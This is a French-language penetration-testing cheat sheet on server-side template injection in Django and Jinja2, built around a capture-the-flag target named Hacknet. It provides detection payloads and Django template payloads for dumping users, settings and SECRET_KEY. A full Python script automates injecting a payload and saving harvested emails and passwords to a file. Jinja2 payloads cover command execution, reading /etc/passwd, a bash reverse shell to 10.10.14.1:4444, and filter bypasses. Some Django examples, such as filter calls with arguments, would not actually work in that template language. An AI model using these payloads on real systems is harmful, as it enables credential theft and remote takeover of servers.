# Server-Side Template Injection (SSTI)

## <mark style="color:red;">🔥 Server-Side Template Injection (SSTI) - Django</mark>

### <mark style="color:blue;">📋 Vue d'ensemble</mark>

**Type de vulnérabilité:** Injection de template côté serveur\
**Frameworks concernés:** Django (DTL - Django Template Language), Jinja2\
**Sévérité:** Critique (RCE potentiel selon le moteur)\
**OWASP:** A03:2021 - Injection

***

### <mark style="color:blue;">🎯 Principes de base</mark>

#### Django Template Language (DTL) vs Jinja2

| Caractéristique              | Django (DTL) | Jinja2 |
| ---------------------------- | ------------ | ------ |
| **Exécution Python**         | ❌ Non        | ✅ Oui  |
| **Opérations arithmétiques** | ❌ Non        | ✅ Oui  |
| **Appels système**           | ❌ Non        | ✅ Oui  |
| **RCE direct**               | ❌ Non        | ✅ Oui  |
| **Fuite de données**         | ✅ Oui        | ✅ Oui  |

#### <mark style="color:blue;">⚠️ Limitation importante de Django DTL</mark>

Django DTL ne permet **PAS** l'exécution de code Python arbitraire :

```django
{{ 7*7 }}                    # Ne calcule PAS → affiche "7*7"
{{ ().__class__ }}           # Ne fonctionne PAS
{{ os.environ }}             # Ne fonctionne PAS
```

**Ce qui fonctionne en DTL :**

* Affichage de variables du contexte : `{{ user }}`, `{{ request }}`
* Accès aux attributs : `{{ user.email }}`
* Méthodes Django : `{{ users.all }}`, `{{ users.values }}`

***

### <mark style="color:blue;">🔍 Détection</mark>

#### Payloads de test basiques

```python
# Test de base
{{7*7}}              # Jinja2: 49 | Django: 7*7
${7*7}               # Vélocity, FreeMarker
<%= 7*7 %>           # ERB (Ruby)
${{7*7}}             # Combined

# Test Django spécifique
{{ request }}        # Affiche l'objet request si disponible
{{ settings }}       # Peut exposer les settings Django
{{ debug }}          # Variable de debug
```

#### <mark style="color:green;">Indicateurs de vulnérabilité</mark>

1. **Comportement anormal** : Contenu dynamique basé sur l'input utilisateur
2. **Erreurs de template** : Messages d'erreur Django exposant le moteur
3. **Réflexion du contexte** : Variables qui s'affichent différemment

#### Points d'injection courants

```python
# Champs utilisateur
- Username
- Bio / About
- Profile description
- Comments / Posts
- Custom messages

# Headers HTTP
- User-Agent
- Referer
- X-Forwarded-For

# Paramètres GET/POST
- ?name={{ payload }}
- ?template={{ payload }}
```

***

### <mark style="color:blue;">💣 Exploitation Django DTL</mark>

#### <mark style="color:green;">1. Énumération du contexte</mark>

```django
# Lister toutes les variables disponibles
{{ locals }}
{{ globals }}
{{ self }}

# Variables Django communes
{{ request }}
{{ user }}
{{ settings }}
{{ csrf_token }}
{{ perms }}
```

#### <mark style="color:green;">2. Extraction de données sensibles</mark>

**A. Énumération des utilisateurs**

```django
# Obtenir la liste des utilisateurs
{{ users }}
{{ User.objects.all }}

# Avec QuerySet
{{ users.values }}
{{ users.values_list }}

# Filtrer les données
{{ users.filter }}
{{ User.objects.filter }}
```

<mark style="color:green;">**Exemple pratique (cas Hacknet) :**</mark>

```python
# Étape 1 : Injection dans le champ username
Username: {{ users }}

# Étape 2 : Trigger du rendering (like un post)
# Observer la réponse dans la liste des likes

# Étape 3 : Extraction des valeurs
Username: {{ users.values }}

# Résultat obtenu :
<QuerySet [
    {'id': 1, 'username': 'admin', 'email': 'admin@example.com', 'password': 'hash123'},
    {'id': 2, 'username': 'user1', 'email': 'user1@example.com', 'password': 'pass456'}
]>
```

<mark style="color:green;">**B. Accès aux modèles Django**</mark>

```django
# Importer des modèles
{{ user.__class__ }}
{{ user._meta }}
{{ user._meta.model }}

# Lister les champs d'un modèle
{{ user._meta.get_fields }}
{{ user._meta.fields }}

# Accéder à d'autres modèles via relations
{{ user.groups.all }}
{{ user.user_permissions.all }}
```

<mark style="color:green;">**C. Extraction de settings sensibles**</mark>

```django
{{ settings.SECRET_KEY }}
{{ settings.DATABASES }}
{{ settings.DEBUG }}
{{ settings.ALLOWED_HOSTS }}
{{ settings.INSTALLED_APPS }}
```

#### <mark style="color:green;">3. Accès à la base de données</mark>

```django
# Via les managers Django
{{ User.objects.all }}
{{ User.objects.filter(is_superuser=True) }}
{{ User.objects.values }}
{{ User.objects.values_list }}

# Raw SQL (si disponible)
{{ User.objects.raw }}
```

#### <mark style="color:green;">**4. Exploitation avancée**</mark>

**Chaînage de méthodes**

```django
# Parcourir les relations
{{ user.profile.address.city }}

# Utiliser les méthodes QuerySet
{{ Post.objects.filter(author__username='admin').values }}

# Accéder aux ManyToMany
{{ user.groups.all.0.permissions.all }}
```

**Exploitation de `request`**

```django
{{ request.user }}
{{ request.session }}
{{ request.META }}
{{ request.COOKIES }}
{{ request.FILES }}
{{ request.GET }}
{{ request.POST }}
```

***

### <mark style="color:blue;">🛠️ Script d'exploitation automatisé</mark>

#### <mark style="color:green;">Script Python pour extraction massive</mark>

{% code fullWidth="true" %}
```python
#!/usr/bin/env python3
import requests
import re
import html
from bs4 import BeautifulSoup

class DjangoSSTIExploit:
    def __init__(self, base_url, cookies):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.update(cookies)
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        }
    
    def inject_payload(self, payload, injection_point='/profile/edit'):
        """Injecte le payload SSTI"""
        data = {'username': payload}
        response = self.session.post(
            f"{self.base_url}{injection_point}",
            data=data,
            headers=self.headers
        )
        return response
    
    def trigger_rendering(self, trigger_url='/like/1'):
        """Déclenche le rendu du template"""
        response = self.session.get(
            f"{self.base_url}{trigger_url}",
            headers=self.headers
        )
        return response
    
    def extract_rendered_data(self, response_url='/likes/1'):
        """Extrait les données rendues"""
        response = self.session.get(
            f"{self.base_url}{response_url}",
            headers=self.headers
        )
        html_text = html.unescape(response.text)
        return html_text
    
    def extract_users(self, max_posts=50):
        """Extrait tous les utilisateurs via SSTI"""
        users = set()
        
        # Injection du payload
        self.inject_payload('{{ users.values }}')
        
        for post_id in range(1, max_posts + 1):
            try:
                # Trigger rendering
                self.trigger_rendering(f'/like/{post_id}')
                
                # Extract data
                html_text = self.extract_rendered_data(f'/likes/{post_id}')
                
                # Parse emails et passwords
                emails = re.findall(r"'email': '([^']+)'", html_text)
                passwords = re.findall(r"'password': '([^']+)'", html_text)
                
                for email, password in zip(emails, passwords):
                    username = email.split('@')[0]
                    users.add(f"{username}:{password}")
                
                print(f"[+] Post {post_id}: {len(emails)} utilisateurs extraits")
                
            except Exception as e:
                print(f"[-] Erreur sur post {post_id}: {e}")
                continue
        
        return users
    
    def save_credentials(self, users, output_file='credentials.txt'):
        """Sauvegarde les credentials"""
        with open(output_file, 'w') as f:
            for cred in sorted(users):
                f.write(f"{cred}\n")
        print(f"[+] {len(users)} credentials sauvegardés dans {output_file}")

# Utilisation
if __name__ == "__main__":
    BASE_URL = "http://hacknet.htb"
    COOKIES = {
        'csrftoken': 'YOUR_CSRF_TOKEN',
        'sessionid': 'YOUR_SESSION_ID'
    }
    
    exploit = DjangoSSTIExploit(BASE_URL, COOKIES)
    
    print("[*] Démarrage de l'exploitation SSTI...")
    users = exploit.extract_users(max_posts=50)
    
    print(f"[+] Total: {len(users)} utilisateurs uniques")
    exploit.save_credentials(users)
```
{% endcode %}

***

### <mark style="color:blue;">🔐 Exploitation Jinja2 (RCE)</mark>

Si le serveur utilise Jinja2, l'exploitation est beaucoup plus dangereuse :

#### <mark style="color:green;">Payloads RCE Jinja2</mark>

```python
# RCE basique
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id') }}

# Lecture de fichier
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}

# Reverse shell
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"').read() }}

# Version simplifiée
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Avec request
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### <mark style="color:green;">Bypass de filtres Jinja2</mark>

```python
# Bypass de 'class'
{{ ''['__cla'+'ss__'] }}
{{ ''|attr('__class__') }}

# Bypass de 'subclasses'
{{ ''.__class__.__mro__[1]['__subcla'+'sses__']() }}

# Bypass de quotes
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

# Bypass de points
{{ ''['__class__']['__mro__'][1] }}
```

***

***
